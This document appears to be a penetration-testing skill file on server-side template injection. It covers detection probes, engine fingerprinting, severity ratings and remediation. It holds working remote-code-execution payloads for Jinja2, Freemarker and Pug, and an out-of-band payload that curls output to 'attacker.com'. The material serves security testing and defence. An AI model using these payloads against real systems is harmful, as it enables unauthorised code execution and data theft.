---
name: ssti
description: Server-Side Template Injection testing covering detection, engine fingerprinting, and RCE exploitation
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded unsanitized into a server-side template, allowing code execution in the template engine context and often leading to RCE.

## Attack Surface

**Template Engines**
- Python: Jinja2, Mako, Tornado, Cheetah
- Java: Freemarker, Velocity, Pebble, Thymeleaf
- Node.js: Pug/Jade, Handlebars, EJS, Nunjucks, Twig.js
- Ruby: ERB, Slim, Liquid
- PHP: Twig, Smarty, Blade

**Injection Points**
- Error pages that echo user input
- Email templates, PDF generators
- Custom dashboards with user-controlled text
- Search fields, file names, URL paths reflected in responses

## Testing Methodology

### Step 1 – Polyglot Detection Probe
```
${{<%[%'"}}%\.
```
Errors or unusual output indicate a template context.

### Step 2 – Math Probe (Engine Agnostic)
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```
If the response contains `49`, the input is being evaluated.

### Step 3 – Engine Fingerprinting
| Payload | Engine |
|---------|--------|
| `{{7*'7'}}` → `7777777` | Jinja2 / Twig |
| `${7*7}` → `49` | Freemarker / EL |
| `<%= 7*7 %>` → `49` | ERB / EJS |
| `#{7*7}` → `49` | Ruby ERB |
| `{{= 7*7 }}` → `49` | Pebble |

### Step 4 – RCE via Jinja2 (Python)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Step 5 – RCE via Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
```

### Step 6 – RCE via Pug (Node.js)
```
#{root.process.mainModule.require('child_process').execSync('id')}
```

### Step 7 – Blind SSTI (Out-of-Band)
```
{{''.__class__.mro()[1].__subclasses__()[396]('curl attacker.com/$(id)',shell=True,stdout=-1).communicate()}}
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| RCE achieved | Critical |
| File read / environment variable disclosure | High |
| Template expression evaluated, no code exec | Medium |

## Remediation

- Never pass raw user input to template render functions
- Use sandboxed template environments (Jinja2 `SandboxedEnvironment`)
- Validate and escape all user data before template interpolation
- Use logic-less templates (Mustache) where dynamic execution is not needed
